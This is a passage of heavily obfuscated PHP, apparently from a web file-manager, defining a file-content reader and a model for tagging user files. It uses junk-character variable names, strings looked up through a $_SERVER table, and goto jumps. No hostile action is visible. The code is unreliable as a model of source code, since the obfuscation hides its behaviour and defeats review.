PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÏÙæÜİÎ, $´ÔĞÅÈ‡ = 0) { parent::__construct(); $this->source = $ÏÙæÜİÎ; $this->sourceSize = $´ÔĞÅÈ‡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($òÒº£ğ = false) { return $this->sourceSize; } public function getContent($•Ã¤³ÓÛ = false) { return $this->fileSubstr($•Ã¤³ÓÛ, 0, $this->sourceSize); } public function fileSubstr($ú¢»² = false, $ÇıÔÓÛ‘ = 0, $§À’ÂŸ = 0) { if (!$§À’ÂŸ) { $§À’ÂŸ = $this->sourceSize; } $İü¨ìÙË = $this->sourceSize - $ÇıÔÓÛ‘; if ($§À’ÂŸ >= $İü¨ìÙË) { $§À’ÂŸ = $İü¨ìÙË; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÇıÔÓÛ‘, $§À’ÂŸ); } if ($this->sourceType == self::TYPE_FILE) { if ($§À’ÂŸ <= 0) { return $_SERVER[ •ŒÓîÆ][12]; } $ÙÚËŠ±­ = ftell($this->source); fseek_64($this->source, $ÙÚËŠ±­ + $ÇıÔÓÛ‘); $†íàœ¶± = @fread($this->source, $§À’ÂŸ); fseek_64($this->source, $ÙÚËŠ±­); return $†íàœ¶±; } } public function hashMd5($ƒ›”Âş = false) { return md5($this->getContent()); } public static function hash($£¦ƒ…Ñ„, $»æÕ‡†² = 0) { $”¢–Ä = new PathDriverStream($£¦ƒ…Ñ„, $»æÕ‡†²); return $”¢–Ä->hashSimple($£¦ƒ…Ñ„); } public static function md5($·ÚØ¨¡Œ, $§è©¯ØÎ = 0) { $Àù“Œ‚ = new PathDriverStream($·ÚØ¨¡Œ, $§è©¯ØÎ); return $Àù“Œ‚->hashMd5($·ÚØ¨¡Œ); } } goto cçÙÌ¼ååÃ; Dâï·•îĞ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($…ëšÏì‡) { $´õ€¡éÆ =& $_SERVER[ •ŒÓîÆ]; return array($´õ€¡éÆ[1999] => array($´õ€¡éÆ[2388] . USER_ID, $´õ€¡éÆ[2000])); } protected function listData() { $Ô©òÓØ =& $_SERVER[ •ŒÓîÆ]; $òë²İ = array($Ô©òÓØ[1681] => USER_ID, $Ô©òÓØ[537] => array($Ô©òÓØ[2003], 0)); $å•²ŠÌ› = $Ô©òÓØ[2389]; $úÛê‚ç» = $this->field($å•²ŠÌ›)->where($òë²İ)->order($Ô©òÓØ[2006])->select(); return $úÛê‚ç» ? $úÛê‚ç» : array(); } protected function addToTag($“Â†¡˜Â, $šÆéÅß) { $¢ÇÖƒÉ =& $_SERVER[ •ŒÓîÆ]; if (!Model($¢ÇÖƒÉ[2148])->listData($šÆéÅß)) { return !1; } if (is_numeric($“Â†¡˜Â)) { $–¾¢åÃ¨ = Model($¢ÇÖƒÉ[866])->pathInfo($“Â†¡˜Â); if (!$–¾¢åÃ¨) { return !1; } } else { $–¾¢åÃ¨ = IO::infoSimple($“Â†¡˜Â); if (!$–¾¢åÃ¨) { return !1; } $üÛÆ±Íì = $–¾¢åÃ¨[$¢ÇÖƒÉ[32]]; $¼Öê²¯Í = $–¾¢åÃ¨[$¢ÇÖƒÉ[33]]; if (isset($–¾¢åÃ¨[$¢ÇÖƒÉ[464]])) { $¼Öê²¯Í = $–¾¢åÃ¨[$¢ÇÖƒÉ[464]] == $¢ÇÖƒÉ[90] ? $¢ÇÖƒÉ[77] : $¢ÇÖƒÉ[216]; } } $è¼‚ºÌ« = array($¢ÇÖƒÉ[1681] => USER_ID, $¢ÇÖƒÉ[537] => $šÆéÅß, $¢ÇÖƒÉ[474] => $“Â†¡˜Â, $¢ÇÖƒÉ[475] => $¼Öê²¯Í ? $¼Öê²¯Í : $¢ÇÖƒÉ[469], $¢ÇÖƒÉ[473] => $üÛÆ±Íì ? $üÛÆ±Íì : $¢ÇÖƒÉ[12], $¢ÇÖƒÉ[1892] => 0); if ($this->where($è¼‚ºÌ«)->find()) { return !1; } return $this->add($è¼‚ºÌ«); } protected function removeFromTag($œ‘ÖË’à, $£ĞçÏõâ) { $ùä™ö”½ =& $_SERVER[ •ŒÓîÆ]; if (!Model($ùä™ö”½[2148])->listData($£ĞçÏõâ)) { return !1; } if (is_array($œ‘ÖË’à)) { $œ‘ÖË’à = array($ùä™ö”½[7], $œ‘ÖË’à); } $ğ¯…¨Ê = array($ùä™ö”½[1681] => USER_ID, $ùä™ö”½[537] => $£ĞçÏõâ, $ùä™ö”½[474] => $œ‘ÖË’à); return $this->where($ğ¯…¨Ê)->delete(); } protected function removeByTag($Áé»Ã) { $æÖè Ì§ =& $_SERVER[ •ŒÓîÆ]; if (!$Áé»Ã) { return !1; } $İßÕò = array($æÖè Ì§[1681] => USER_ID, $æÖè Ì§[537] => $Áé»Ã); return $this->where($İßÕò)->delete(); } protected function removeBySource($Ï¤ìùÈÖ) { $¡‰ôÃ°« =& $_SERVER[ •ŒÓîÆ]; if (is_array($Ï¤ìùÈÖ)) { $Ï¤ìùÈÖ = array($¡‰ôÃ°«[7], $Ï¤ìùÈÖ); } $õ§û­üÚ = array($¡‰ôÃ°«[1681] => USER_ID, $¡‰ôÃ°«[537] => array($¡‰ôÃ°«[1055], 0), $¡‰ôÃ°«[474] => $Ï¤ìùÈÖ); return $this->where($õ§û­üÚ)->delete(); } }